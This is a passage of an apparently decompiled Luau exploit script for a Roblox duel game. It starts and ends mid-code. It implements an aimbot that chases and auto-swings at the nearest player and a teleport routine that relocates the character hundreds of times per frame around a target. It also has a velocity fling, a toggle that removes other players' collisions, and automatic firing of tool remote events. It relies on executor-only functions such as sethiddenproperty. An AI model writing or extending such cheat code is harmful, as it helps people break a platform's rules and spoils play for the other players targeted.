						local v86 = character:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if v86 then
							v86:Move(Vector3.zero, false)
							v86.WalkSpeed = getActiveMoveSpeed()
						end

						if humanoidRootPart then
							humanoidRootPart.AssemblyLinearVelocity =
								Vector3.new(0, humanoidRootPart.AssemblyLinearVelocity.Y, 0)
						end
					end

					if autoRightSetVisual then
						autoRightSetVisual(false)
					end

					if mobBtnRefs.autoRight then
						mobBtnRefs.autoRight(false)
					end

					if toggleRefs.autoRight then
						toggleRefs.autoRight(false)
					end

					if setAR then
						setAR(false)
					end
				end

				startAutoLeft = function()
					if fn34() then
						return
					end
					autoLeftEnabled = true
					State.autoLeftEnabled = true

					if State.autoRightEnabled or autoRightEnabled then
						autoRightEnabled = false
						State.autoRightEnabled = false
						stopAutoRight()

						if toggleRefs.autoRight then
							toggleRefs.autoRight(false)
						end

						if setAR then
							setAR(false)
						end
					end

					if alConn then
						alConn:Disconnect()
						alConn = nil
					end

					alPhase = 1

					alConn = RunService.Heartbeat:Connect(function()
						if not State.autoLeftEnabled then
							return
						end

						local character = LP.Character
						if not character then
							return
						end
						local v86 = character:FindFirstChild("HumanoidRootPart")
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if not v86 or not humanoid then
							return
						end

						if isRagdollState(humanoid) then
							humanoid:Move(Vector3.zero, false)
							return
						end
						local v87 = getAutoPathSpeed()

						if alPhase == 1 then
							local position = v86.Position

							if (Vector3.new(AP_L1.X, v86.Position.Y, AP_L1.Z) - position).Magnitude < 1 then
								alPhase = 2
								local n32 = AP_L2 - v86.Position
								local unit = Vector3.new(n32.X, 0, n32.Z).Unit
								humanoid:Move(unit, false)
								fn35(v86, Vector3.new(unit.X * v87, 0, unit.Z * v87))
								return
							end

							local n32 = AP_L1 - v86.Position
							local unit = Vector3.new(n32.X, 0, n32.Z).Unit
							humanoid:Move(unit, false)
							fn35(v86, Vector3.new(unit.X * v87, 0, unit.Z * v87))
						elseif alPhase == 2 then
							local position = v86.Position

							if (Vector3.new(AP_L2.X, v86.Position.Y, AP_L2.Z) - position).Magnitude < 1 then
								humanoid:Move(Vector3.zero, false)
								v86.AssemblyLinearVelocity = Vector3.zero
								humanoid.WalkSpeed = getAutoPathSpeed()
								autoLeftEnabled = false
								State.autoLeftEnabled = false

								if alConn then
									alConn:Disconnect()
									alConn = nil
								end

								alPhase = 1

								if autoLeftSetVisual then
									autoLeftSetVisual(false)
								end

								if mobBtnRefs.autoLeft then
									mobBtnRefs.autoLeft(false)
								end

								if toggleRefs.autoLeft then
									toggleRefs.autoLeft(false)
								end

								if setAL then
									setAL(false)
								end

								if 0.5 < (AP_L_FACE - v86.Position).Magnitude then
									v86.CFrame =
										CFrame.new(v86.Position, Vector3.new(AP_L_FACE.X, v86.Position.Y, AP_L_FACE.Z))
								end

								return
							end

							local n32 = AP_L2 - v86.Position
							local unit = Vector3.new(n32.X, 0, n32.Z).Unit
							humanoid:Move(unit, false)
							fn35(v86, Vector3.new(unit.X * v87, 0, unit.Z * v87))
						end

						humanoid.WalkSpeed = v87

						if autoMoveSwingEnabled and not _alSwingDebounce then
							_alSwingDebounce = true
							local v88 = findBat()

							if v88 then
								if v88.Parent ~= character then
									pcall(function()
										humanoid:EquipTool(v88)
									end)
								end

								pcall(function()
									v88:Activate()
								end)
							end

							task.delay(autoMoveSwingInterval, function()
								_alSwingDebounce = false
							end)
						end
					end)
				end

				startAutoRight = function()
					if fn34() then
						return
					end

					autoRightEnabled = true
					State.autoRightEnabled = true

					if State.autoLeftEnabled or autoLeftEnabled then
						autoLeftEnabled = false
						State.autoLeftEnabled = false
						stopAutoLeft()

						if toggleRefs.autoLeft then
							toggleRefs.autoLeft(false)
						end

						if setAL then
							setAL(false)
						end
					end

					if arConn then
						arConn:Disconnect()
						arConn = nil
					end

					arPhase = 1

					arConn = RunService.Heartbeat:Connect(function()
						if not State.autoRightEnabled then
							return
						end
						local character = LP.Character
						if not character then
							return
						end
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if not humanoidRootPart or not humanoid then
							return
						end

						if isRagdollState(humanoid) then
							humanoid:Move(Vector3.zero, false)
							return
						end
						local v86 = getAutoPathSpeed()

						if arPhase == 1 then
							local position = humanoidRootPart.Position

							if
								(Vector3.new(AP_R1.X, humanoidRootPart.Position.Y, AP_R1.Z) - position).Magnitude < 1
							then
								arPhase = 2
								local n32 = AP_R2 - humanoidRootPart.Position
								local unit = Vector3.new(n32.X, 0, n32.Z).Unit
								humanoid:Move(unit, false)
								fn35(humanoidRootPart, Vector3.new(unit.X * v86, 0, unit.Z * v86))
								return
							end

							local n32 = AP_R1 - humanoidRootPart.Position
							local unit = Vector3.new(n32.X, 0, n32.Z).Unit
							humanoid:Move(unit, false)
							fn35(humanoidRootPart, Vector3.new(unit.X * v86, 0, unit.Z * v86))
						elseif arPhase == 2 then
							local position = humanoidRootPart.Position

							if
								(Vector3.new(AP_R2.X, humanoidRootPart.Position.Y, AP_R2.Z) - position).Magnitude < 1
							then
								humanoid:Move(Vector3.zero, false)
								humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
								humanoid.WalkSpeed = getAutoPathSpeed()
								autoRightEnabled = false
								State.autoRightEnabled = false

								if arConn then
									arConn:Disconnect()
									arConn = nil
								end

								arPhase = 1

								if autoRightSetVisual then
									autoRightSetVisual(false)
								end

								if mobBtnRefs.autoRight then
									mobBtnRefs.autoRight(false)
								end

								if toggleRefs.autoRight then
									toggleRefs.autoRight(false)
								end

								if setAR then
									setAR(false)
								end

								if (AP_R_FACE - humanoidRootPart.Position).Magnitude > 0.01 then
									humanoidRootPart.CFrame = CFrame.new(
										humanoidRootPart.Position,
										Vector3.new(AP_R_FACE.X, humanoidRootPart.Position.Y, AP_R_FACE.Z)
									)
								end

								return
							end

							local n32 = AP_R2 - humanoidRootPart.Position
							local unit = Vector3.new(n32.X, 0, n32.Z).Unit
							humanoid:Move(unit, false)
							fn35(humanoidRootPart, Vector3.new(unit.X * v86, 0, unit.Z * v86))
						end

						humanoid.WalkSpeed = v86

						if autoMoveSwingEnabled and not _arSwingDebounce then
							_arSwingDebounce = true
							local v87 = findBat()

							if v87 then
								if v87.Parent ~= character then
									pcall(function()
										humanoid:EquipTool(v87)
									end)
								end

								pcall(function()
									v87:Activate()
								end)
							end

							task.delay(autoMoveSwingInterval, function()
								_arSwingDebounce = false
							end)
						end
					end)
				end

				do
					local v86 = 140
					DROP_ASCEND_DURATION = 0.2
					DROP_ASCEND_SPEED = v86
				end
			end

			dropActive = false
			dropBrainrotActive = false
			selectedDropMode = selectedDropMode or "Walk"

			do
				local tbl17 = {}

				local function fn43()
					for _, v86 in ipairs(tbl17) do
						if typeof(v86) == "RBXScriptConnection" then
							pcall(function()
								v86:Disconnect()
							end)
						elseif type(v86) == "thread" then
							pcall(coroutine.close, v86)
						end
					end

					table.clear(tbl17)
				end

				runDropBrainrot = function()
					if dropBrainrotActive or dropActive then
						return
					end
					local character = LP.Character
					if not (character and character:FindFirstChild("HumanoidRootPart")) then
						return
					end

					if autoBatEnabled then
						autoBatEnabled = false

						if resetAutoBatMotion then
							resetAutoBatMotion()
						end

						if autoBatSetVisual then
							autoBatSetVisual(false)
						end
					end

					dropBrainrotActive = true
					dropActive = true
					local now2 = tick()
					local connection = nil

					connection = RunService.Heartbeat:Connect(function()
						local character2 = LP.Character
						character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

						if not character2 then
							pcall(function()
								connection:Disconnect()
							end)

							dropBrainrotActive = false
							dropActive = false
							return
						end

						if DROP_ASCEND_DURATION <= tick() - now2 then
							pcall(function()
								connection:Disconnect()
							end)

							character2.AssemblyLinearVelocity = Vector3.zero
							character2.AssemblyAngularVelocity = Vector3.zero

							if runTPFloor then
								pcall(runTPFloor)
							elseif doAutoTPDown then
								pcall(doAutoTPDown, true)
							end

							dropBrainrotActive = false
							dropActive = false
							return
						end

						character2.Velocity =
							Vector3.new(character2.Velocity.X, DROP_ASCEND_SPEED, character2.Velocity.Z)
					end)

					table.insert(tbl17, connection)
				end

				runDropStandStill = function()
					if dropActive or dropBrainrotActive then
						return
					end

					if autoBatEnabled then
						autoBatEnabled = false

						if resetAutoBatMotion then
							resetAutoBatMotion()
						end

						if autoBatSetVisual then
							autoBatSetVisual(false)
						end
					end

					dropActive = true

					local connection = RunService.Stepped:Connect(function()
						if not dropActive then
							return
						end

						for _, player_ in ipairs(Players:GetPlayers()) do
							if player_ ~= LP and player_.Character then
								for _, child in ipairs(player_.Character:GetChildren()) do
									if child:IsA("BasePart") then
										child.CanCollide = false
									end
								end
							end
						end
					end)

					table.insert(tbl17, connection)

					local thread = coroutine.create(function()
						while dropActive do
							RunService.Heartbeat:Wait()
							local character = LP.Character
							local v86 = character and character:FindFirstChild("HumanoidRootPart")

							if v86 then
								local velocity = v86.Velocity
								v86.Velocity = velocity * 10000 + Vector3.new(0, 10000, 0)
								RunService.RenderStepped:Wait()

								if v86 and v86.Parent then
									v86.Velocity = velocity
								end

								RunService.Stepped:Wait()

								if v86 and v86.Parent then
									v86.Velocity = velocity + Vector3.new(0, 0.1, 0)
								end

								continue
							end

							break
						end
					end)

					table.insert(tbl17, thread)
					coroutine.resume(thread)

					task.delay(0.2, function()
						if not dropActive then
							return
						end
						dropActive = false
						dropBrainrotActive = false
						fn43()
					end)
				end
			end
		end
	end

	do
		runDrop = function()
			if selectedDropMode == "Stand Still" then
				runDropStandStill()
			else
				runDropBrainrot()
			end

			return
		end

		dropBrainrotMode = selectedDropMode

		doAutoTPDown = function(arg)
			local character = LP.Character
			if not character then
				return
			end
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid then
				return
			end

			if not arg then
				if humanoid.FloorMaterial ~= Enum.Material.Air then
					return
				end

				if not (humanoidRootPart.Position.Y >= autoTPHeight) then
					return
				end
			end

			local cframe = CFrame.Angles
			local cFrame = humanoidRootPart.CFrame
			local v86 = 0
			humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -7, humanoidRootPart.Position.Z)
				* cframe(0, select(2, cFrame:ToEulerAnglesYXZ()), v86)
			humanoidRootPart.Velocity = Vector3.zero
		end

		startAutoTP = function()
			if autoTPConn then
				task.cancel(autoTPConn)
				autoTPConn = nil
			end

			autoTPConn = task.spawn(function()
				while autoTPEnabled do
					task.wait(0.2)

					pcall(function()
						doAutoTPDown(false)
					end)
				end
			end)
		end

		stopAutoTP = function()
			autoTPEnabled = false

			if autoTPConn then
				task.cancel(autoTPConn)
				autoTPConn = nil
			end
		end

		runTPFloor = function()
			pcall(function()
				doAutoTPDown(true)
			end)
		end

		STRETCH_NAME = "Phantom_Stretch"

		enableStretchRez = function()
			stretchRezEnabled = true

			if stretchRezConn then
				stretchRezConn:Disconnect()
			end

			pcall(function()
				RunService:UnbindFromRenderStep(STRETCH_NAME)
			end)

			pcall(function()
				RunService:BindToRenderStep(STRETCH_NAME, Enum.RenderPriority.Last.Value - 1, function()
					local currentCamera = workspace.CurrentCamera

					if currentCamera then
						currentCamera.CFrame = currentCamera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.8, 0, 0, 0, 1)
					end
				end)
			end)
		end

		disableStretchRez = function()
			stretchRezEnabled = false

			pcall(function()
				RunService:UnbindFromRenderStep(STRETCH_NAME)
			end)
		end

		defLightBrightness = nil
		defLightClock = nil
		defLightAmbient = nil

		applyAntiLagDerender = function(arg)
			pcall(function()
				if arg:IsA("Accessory") or arg:IsA("Hat") then
					arg:Destroy()
				elseif arg:IsA("BasePart") then
					arg.Material = Enum.Material.Plastic
					arg.Reflectance = 0
					arg.CastShadow = false
				elseif arg:IsA("Decal") or arg:IsA("Texture") then
					arg.Transparency = 1
				elseif
					arg:IsA("ParticleEmitter")
					or arg:IsA("Trail")
					or arg:IsA("Beam")
					or arg:IsA("Fire")
					or arg:IsA("Smoke")
					or arg:IsA("Sparkles")
				then
					arg.Enabled = false
				end
			end)
		end

		enableAntiLag = function()
			removeAccessoriesEnabled = true
			antiLagEnabled = true
			defLightBrightness = defLightBrightness or Lighting.Brightness
			defLightClock = defLightClock or Lighting.ClockTime
			defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
			Lighting.GlobalShadows = false
			Lighting.FogEnd = 100000
			Lighting.Brightness = 1
			Lighting.EnvironmentDiffuseScale = 0
			Lighting.EnvironmentSpecularScale = 0

			for _, child in pairs(Lighting:GetChildren()) do
				pcall(function()
					if
						child:IsA("BlurEffect")
						or child:IsA("SunRaysEffect")
						or child:IsA("ColorCorrectionEffect")
						or child:IsA("BloomEffect")
						or child:IsA("DepthOfFieldEffect")
					then
						child.Enabled = false
					end
				end)
			end

			for _, descendant in ipairs(workspace:GetDescendants()) do
				applyAntiLagDerender(descendant)
			end

			if antiLagDescConn then
				antiLagDescConn:Disconnect()
			end

			antiLagDescConn = workspace.DescendantAdded:Connect(function(descendant)
				if removeAccessoriesEnabled then
					applyAntiLagDerender(descendant)
				end
			end)
		end

		disableAntiLag = function()
			removeAccessoriesEnabled = false
			antiLagEnabled = false

			if antiLagDescConn then
				antiLagDescConn:Disconnect()
				antiLagDescConn = nil
			end

			pcall(function()
				if defLightBrightness then
					Lighting.Brightness = defLightBrightness
				end

				if defLightClock then
					Lighting.ClockTime = defLightClock
				end

				if defLightAmbient then
					Lighting.OutdoorAmbient = defLightAmbient
				end

				Lighting.ExposureCompensation = 0
			end)
		end

		findMedusa = function()
			local character = LP.Character
			if not character then
				return nil
			end

			for _, child in ipairs(character:GetChildren()) do
				if child:IsA("Tool") then
					local str6 = child.Name:lower()
					if str6:find("medusa") or str6:find("head") or str6:find("stone") then
						return child
					end
				end
			end

			local backpack = LP:FindFirstChild("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if child:IsA("Tool") then
						local str6 = child.Name:lower()
						if str6:find("medusa") or str6:find("head") or str6:find("stone") then
							return child
						end
					end
				end
			end

			return nil
		end

		useMedusaCounter = function()
			if medusaDebounce then
				return
			end
			local v86 = MEDUSA_COOLDOWN
			local v87 = medusaLastUsed
			if tick() - v87 < v86 then
				return
			end
			local character = LP.Character
			if not character then
				return
			end
			medusaDebounce = true
			local v88 = findMedusa()
			if not v88 then
				medusaDebounce = false
				return
			end

			if v88.Parent ~= character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid:EquipTool(v88)
				end
			end

			pcall(function()
				v88:Activate()
			end)

			medusaLastUsed = tick()
			medusaDebounce = false
		end

		onAnchorChanged = function(arg)
			return arg:GetPropertyChangedSignal("Anchored"):Connect(function()
				if arg.Anchored then
				end
			end)
		end

		do
			local function fn35()
				local medusaAnchor = Conns.medusaAnchor or {}

				for _, v86 in ipairs(medusaAnchor) do
					pcall(function()
						v86:Disconnect()
					end)
				end

				Conns.medusaAnchor = {}
			end

			local function fn36(arg)
				return arg:GetPropertyChangedSignal("Anchored"):Connect(function()
					if medusaCounterEnabled and arg.Anchored and arg.Transparency == 1 then
						useMedusaCounter()
					end
				end)
			end

			setupMedusaCounter = function(arg)
				fn35()
				if not (medusaCounterEnabled and arg) then
					return
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("BasePart") then
						table.insert(Conns.medusaAnchor, fn36(descendant))
					end
				end

				table.insert(
					Conns.medusaAnchor,
					arg.DescendantAdded:Connect(function(descendant)
						if descendant:IsA("BasePart") then
							table.insert(Conns.medusaAnchor, fn36(descendant))
						end
					end)
				)
			end

			startMedusaCounter = function()
				medusaCounterEnabled = true
				setupMedusaCounter(LP.Character)
				if Conns.medusaRespawn then
					return
				end

				Conns.medusaRespawn = LP.CharacterAdded:Connect(function(character)
					if not medusaCounterEnabled then
						return
					end
					task.wait(0.12)
					setupMedusaCounter(character)
				end)
			end

			stopMedusaCounter = function()
				medusaCounterEnabled = false
				fn35()

				if Conns.medusaRespawn then
					pcall(function()
						Conns.medusaRespawn:Disconnect()
					end)

					Conns.medusaRespawn = nil
				end

				medusaDebounce = false
			end
		end
	end

	do
		local function fn35(arg, arg2)
			local humanoid = arg2 and arg2:FindFirstChildOfClass("Humanoid")

			if arg and arg.Parent ~= arg2 and humanoid then
				pcall(function()
					humanoid:EquipTool(arg)
				end)

				task.wait(0.05)
			end

			if not arg then
				return
			end
			local remoteEvent = arg:FindFirstChildOfClass("RemoteEvent") or arg:FindFirstChildOfClass("RemoteFunction")

			if remoteEvent and remoteEvent:IsA("RemoteEvent") then
				pcall(function()
					remoteEvent:FireServer()
				end)

				task.wait(0.15)

				pcall(function()
					remoteEvent:FireServer()
				end)
			else
				pcall(function()
					arg:Activate()
				end)

				task.wait(0.15)

				pcall(function()
					arg:Activate()
				end)
			end
		end

		startBatCounter = function()
			batCounterEnabled = true
			if Conns.batCounter then
				return
			end

			Conns.batCounter = RunService.Heartbeat:Connect(function()
				if not batCounterEnabled or batCounterDebounce then
					return
				end
				local character = LP.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end
				local state = humanoid:GetState()

				if
					state == Enum.HumanoidStateType.Physics
					or state == Enum.HumanoidStateType.Ragdoll
					or state == Enum.HumanoidStateType.FallingDown
				then
					batCounterDebounce = true

					task.spawn(function()
						local v86 = findBat()

						if v86 then
							fn35(v86, character)
						end

						task.wait(0.5)
						batCounterDebounce = false
					end)
				end
			end)
		end
	end
end

do
	do
		local n32, n33, n34

		do
			do
				do
					do
						local fn35

						do
							stopBatCounter = function()
								batCounterEnabled = false

								if Conns.batCounter then
									pcall(function()
										Conns.batCounter:Disconnect()
									end)

									Conns.batCounter = nil
								end

								batCounterDebounce = false
							end

							aimbotConn = nil

							getBatAimbotChaseSpeed = function()
								return laggerModeEnabled and 40 or 58
							end

							_predBall = nil

							BAT_SLAP_LIST = {
								"Bat",
								"Slap",
								"Iron Slap",
								"Gold Slap",
								"Diamond Slap",
								"Emerald Slap",
								"Ruby Slap",
								"Dark Matter Slap",
								"Flame Slap",
								"Nuclear Slap",
								"Galaxy Slap",
								"Glitched Slap",
							}

							findBat = function()
								local character = LP.Character
								if not character then
									return nil
								end

								for _, v86 in ipairs(BAT_SLAP_LIST) do
									local v87 = character:FindFirstChild(v86)
									if v87 and v87:IsA("Tool") then
										return v87
									end
								end

								local v86 = LP:FindFirstChildOfClass("Backpack")

								if v86 then
									for _, v87 in ipairs(BAT_SLAP_LIST) do
										local v88 = v86:FindFirstChild(v87)

										if v88 and v88:IsA("Tool") then
											local humanoid = character:FindFirstChildOfClass("Humanoid")

											if humanoid then
												pcall(function()
													humanoid:EquipTool(v88)
												end)
											end

											return v88
										end
									end
								end

								for _, child in ipairs(character:GetChildren()) do
									if
										child:IsA("Tool")
										and (child.Name:lower():find("bat") or child.Name:lower():find("slap"))
									then
										return child
									end
								end

								return nil
							end

							getClosestTarget = function()
								local humanoidRootPart = LP.Character
									and LP.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart then
									local huge = math.huge
									local v86 = nil

									for _, player_ in ipairs(Players:GetPlayers()) do
										if player_ ~= LP and player_.Character then
											local v87 = player_.Character:FindFirstChild("HumanoidRootPart")
											local humanoid = player_.Character:FindFirstChildOfClass("Humanoid")

											if v87 and humanoid and humanoid.Health > 0 then
												local magnitude = (v87.Position - humanoidRootPart.Position).Magnitude

												if magnitude < huge then
													huge = magnitude
													v86 = v87
												end
											end
										end
									end

									return v86, huge
								end
							end

							swingCurrentBat = function()
								if not autoSwingEnabled then
									return
								end
								local v86 = findBat()

								if v86 and v86.Parent == LP.Character and v86:IsA("Tool") then
									pcall(function()
										v86:Activate()
									end)
								end
							end

							trySwing = function()
								if not autoSwingEnabled then
									return
								end
								local v86 = findBat()

								if v86 and v86.Parent == LP.Character and v86:IsA("Tool") then
									pcall(function()
										v86:Activate()
									end)
								end
							end

							startBatAimbot = function()
								if aimbotConn then
									aimbotConn:Disconnect()
								end

								autoBatEnabled = true
								autoSwingEnabled = true

								if autoSwingSetVisual then
									autoSwingSetVisual(true)
								end

								fn34()

								if autoLeftEnabled then
									autoLeftEnabled = false

									if autoLeftSetVisual then
										autoLeftSetVisual(false)
									end

									stopAutoLeft()
								end

								if autoRightEnabled then
									autoRightEnabled = false

									if autoRightSetVisual then
										autoRightSetVisual(false)
									end

									stopAutoRight()
								end

								local humanoid = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")

								if humanoid then
									humanoid.AutoRotate = false
								end

								aimbotConn = RunService.RenderStepped:Connect(function()
									if not autoBatEnabled then
										return
									end
									local character = LP.Character
									if not character then
										return
									end
									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
									if not humanoidRootPart then
										return
									end
									local humanoid2 = character:FindFirstChildOfClass("Humanoid")
									if not humanoid2 then
										return
									end

									if not character:FindFirstChildOfClass("Tool") then
										local v86 = findBat()

										if v86 then
											pcall(function()
												humanoid2:EquipTool(v86)
											end)
										end
									end

									local v86, v87 = getClosestTarget()
									if not v86 then
										swingCurrentBat()
										return
									end
									local assemblyLinearVelocity = v86.AssemblyLinearVelocity
									local position = humanoidRootPart.Position
									local position2 = v86.Position
									local n35 = position2
										+ assemblyLinearVelocity * 0.14
										+ v86.CFrame.LookVector * 0.3
										- position
									local vector = Vector3.new(n35.X, 0, n35.Z)
									local unit

									if vector.Magnitude > 0 then
										unit = vector.Unit
									else
										unit = Vector3.zero
									end

									local n36 = (position2.Y + 3.7 - position.Y) * 19.5 + assemblyLinearVelocity.Y * 0.8
									local n37

									if humanoid2.FloorMaterial ~= Enum.Material.Air then
										n37 = math.max(n36, 12)
									else
										n37 = n36
									end

									humanoidRootPart.AssemblyLinearVelocity =
										humanoidRootPart.AssemblyLinearVelocity:Lerp(
											Vector3.new(unit.X * 60, math.clamp(n37, -70, 110), unit.Z * 60),
											0.8
										)
									local n38 = position2
										+ assemblyLinearVelocity
											* math.clamp(assemblyLinearVelocity.Magnitude / 140, 0.05, 0.4)

									if (n38 - position).Magnitude > 0.1 then
										local cframe = CFrame.lookAt(position, n38)
										local v88, v89, v90 = (humanoidRootPart.CFrame:Inverse() * cframe):ToEulerAnglesXYZ()
										humanoidRootPart.AssemblyAngularVelocity =
											humanoidRootPart.CFrame:VectorToWorldSpace(
												Vector3.new(
													math.clamp(v88, -2.5, 2.5) * 42,
													math.clamp(v89, -2.5, 2.5) * 42,
													math.clamp(v90, -2.5, 2.5) * 42
												)
											)
									end

									if v87 <= 8 then
										trySwing()
									end
								end)

								if autoBatSetVisual then
									autoBatSetVisual(true)
								end

								if mobBtnRefs and mobBtnRefs.autoBat then
									mobBtnRefs.autoBat(true)
								end
							end

							stopBatAimbot = function()
								if aimbotConn then
									aimbotConn:Disconnect()
									aimbotConn = nil
								end

								autoBatEnabled = false

								if _predBall then
									_predBall:Destroy()
									_predBall = nil
								end

								local character = LP.Character
								local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart then
									humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
									humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
								end

								character = character and character:FindFirstChildOfClass("Humanoid")

								if character then
									character.AutoRotate = true
								end

								if autoTPEnabled then
									startAutoTP()
								end

								if autoBatSetVisual then
									autoBatSetVisual(false)
								end

								if mobBtnRefs and mobBtnRefs.autoBat then
									mobBtnRefs.autoBat(false)
								end
							end

							queueAutoBatStart = function()
								if autoLeftEnabled then
									autoLeftEnabled = false

									if autoLeftSetVisual then
										autoLeftSetVisual(false)
									end

									stopAutoLeft()
								end

								if autoRightEnabled then
									autoRightEnabled = false

									if autoRightSetVisual then
										autoRightSetVisual(false)
									end

									stopAutoRight()
								end

								startBatAimbot()
							end

							resetAutoBatMotion = function()
								local character = LP.Character
								local v86 = character and character:FindFirstChild("HumanoidRootPart")
								character = character and character:FindFirstChildOfClass("Humanoid")

								if v86 then
									v86.AssemblyLinearVelocity = v86.AssemblyLinearVelocity * 0.3
									v86.AssemblyAngularVelocity = Vector3.zero
								end

								if character then
									character.AutoRotate = true
								end
							end

							_batTpHitCooldown = false
							n32 = 1
							n33 = 0
							n34 = 0

							do
								local function fn36()
									local character = LP.Character
									if not character then
										return nil
									end
									local bat = character:FindFirstChild("Bat")
									if bat and bat:IsA("Tool") then
										return bat
									end
									local v86 = LP:FindFirstChild("Backpack")

									if v86 then
										local bat2 = v86:FindFirstChild("Bat")

										if bat2 then
											pcall(function()
												bat2.Parent = character
											end)

											return bat2
										end
									end

									return nil
								end

								fn35 = function()
									if _batTpHitCooldown then
										return
									end
									_batTpHitCooldown = true

									pcall(function()
										local v86 = fn36()

										if v86 then
											v86:Activate()
											local v87 = v86:FindFirstChildWhichIsA("RemoteEvent")

											if v87 then
												v87:FireServer()
											end
										end
									end)

									task.delay(0.08, function()
										_batTpHitCooldown = false
									end)
								end
							end
						end

						do
							local function fn36(arg)
								if not arg then
									return nil, math.huge
								end
								local huge = math.huge
								local v86 = nil

								for _, player_ in pairs(Players:GetPlayers()) do
									if player_ ~= LP and player_.Character then
										local humanoidRootPart = player_.Character:FindFirstChild("HumanoidRootPart")

										if humanoidRootPart then
											local magnitude = (arg.Position - humanoidRootPart.Position).Magnitude

											if magnitude < huge then
												huge = magnitude
												v86 = player_
											end
										end
									end
								end

								return v86, huge
							end

							startBatTP = function()
								antiDieEnabled = true

								pcall(function()
									startAntiDie()
								end)

								if antiDieSetVisual then
									pcall(function()
										antiDieSetVisual(true)
									end)
								end

								if _G._nineduelsBatTPConn then
									pcall(function()
										_G._nineduelsBatTPConn:Disconnect()
									end)

									_G._nineduelsBatTPConn = nil
								end

								_batTpHitCooldown = false

								_G._nineduelsBatTPConn = RunService.Heartbeat:Connect(function()
									if not (State and State.batV2Toggled) then
										return
									end
									local character = LP.Character
									local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
									if not humanoidRootPart then
										return
									end
									local v86, v87 = fn36(humanoidRootPart)

									if v86 and v86.Character then
										local v88 = v86.Character:FindFirstChild("HumanoidRootPart")

										if v88 then
											if sethiddenproperty then
												pcall(function()
													sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", v88)
												end)
											end

											local n35 = v88.Position + Vector3.new(0, 0.9, 0)

											if v87 > 8 then
												local assemblyLinearVelocity = v88.AssemblyLinearVelocity
													or Vector3.zero
												local vector =
													Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)

												if vector.Magnitude > 110 then
													vector = vector.Unit * 110
												end

												local n36 = n35 + vector * 0.05
												local lookVector = v88.CFrame.LookVector
												local rightVector = v88.CFrame.RightVector

												if n32 == 1 then
													n33 += 3.3792000000000004
													local v89 = n33
													local v90 = math.cos(v89)
													local v91 = math.sin(v89)
													local n37 = n36
														+ (vector.Magnitude > 0.5 and vector.Unit * 0.5 or Vector3.zero)

													for i = 1, 300 do
														local n38 = (i % 5 - 2) * 0.05
														local n39 = (i % 7 - 3) * 0.04
														local n40 = n37
															+ rightVector * (n38 * v90 - n39 * v91)
															+ lookVector * (0.12 + n38 * v91 + n39 * v90)
															+ Vector3.new(0, (i % 3 - 1) * 0.025, 0)

														pcall(function()
															humanoidRootPart.CFrame = CFrame.new(n40, n37)
														end)
													end

													pcall(function()
														local v92 = n37
														local vector2 = Vector3.new
														humanoidRootPart.CFrame = CFrame.new(
															n37 + Vector3.new(0, 0.15, 0),
															v92 + vector2(math.sin(v89) * 0.4, 0, math.cos(v89) * 0.4)
														)
													end)
												else
													n34 += 4.8
													local v89 = n34
													local n37 = n36
														+ (vector.Magnitude > 0.5 and vector.Unit * 0.5 or Vector3.zero)

													for i = 1, 300 do
														local n38 = i / 300
														local n39 = 1.5 + 1.5 * math.abs(math.sin(n38 * 2 * 3))
														local n40 = v89 + n38 * 12
														local vector2 = Vector3.new
														local n41 = n37
															+ rightVector * math.cos(n40) * n39
															+ lookVector * math.sin(n40) * n39
															+ vector2(0, math.sin(n40 * 1.5) * 0.15, 0)

														pcall(function()
															humanoidRootPart.CFrame = CFrame.new(n41, n37)
														end)
													end

													pcall(function()
														local v90 = n37
														local vector2 = Vector3.new
														local v91 = 0.2
														humanoidRootPart.CFrame = CFrame.new(
															n37 + Vector3.new(0, 0.15, 0),
															v90 + vector2(math.sin(v89) * 0.3, v91, math.cos(v89) * 0.3)
														)
													end)
												end
											end

											local currentCamera = workspace.CurrentCamera

											if currentCamera then
												pcall(function()
													currentCamera.CFrame =
														CFrame.new(currentCamera.CFrame.Position, v88.Position)
												end)
											end

											fn35()
										end
									end
								end)
							end
						end
					end

					do
						stopBatTP = function()
							if State then
								State.batV2Toggled = false
							end

							if _G._nineduelsBatTPConn then
								pcall(function()
									_G._nineduelsBatTPConn:Disconnect()
								end)

								_G._nineduelsBatTPConn = nil
							end

							_batTpHitCooldown = false
						end

						startBatV2 = startBatTP
						stopBatV2 = stopBatTP

						saveConfig = function()
							pcall(function()
								if makefolder and isfolder and not isfolder("NineDuelsV1configLOL1") then
									makefolder("NineDuelsV1configLOL1")
								end
							end)

							local function fn35(arg)
								if arg.kb then
									return { kb = arg.kb.Name, gp = arg.gp and arg.gp.Name }
								end

								if arg.gp then
									return { gp = arg.gp.Name }
								end
								return { kb = nil, gp = nil }
							end

							local tbl17 = {
								normalSpeed = NS,
								carrySpeed = CS,
								antiVoidEnabled = antiVoidEnabled,
								instantResetVersion = instantResetVersion,
								dropBrainrotMode = selectedDropMode,
								baseXRayEnabled = _G.NineDuelsBaseXRayEnabled,
								baseXRayTransparency = _G.NineDuelsBaseXRayTransparency,
